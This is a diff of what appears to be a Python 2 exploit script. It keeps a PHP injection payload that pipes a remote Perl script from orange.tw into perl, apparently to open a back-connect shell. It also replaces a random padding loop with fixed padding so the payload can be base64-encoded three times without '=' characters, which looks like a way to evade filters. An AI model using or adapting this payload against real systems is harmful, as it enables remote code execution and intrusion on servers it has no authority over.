@@ -16,17 +16,9 @@ headers = {
 }
 
 payload = '@<?php `curl orange.tw/w/bc.pl|perl -`;?>'
-
-
-while 1:
-    junk = ''.join(sample(string.ascii_letters, randint(8, 16)))
-    x = b64encode(payload + junk)
-    xx = b64encode(b64encode(payload + junk))
-    xxx = b64encode(b64encode(b64encode(payload + junk)))
-    if '=' not in x and '=' not in xx and '=' not in xxx:
-        payload = xxx
-        print payload
-        break
+payload += 'a' * (27 - len(payload) % 27)
+payload = b64encode(b64encode(b64encode(payload)))
+print payload
 
 def runner1(i):
     data = {
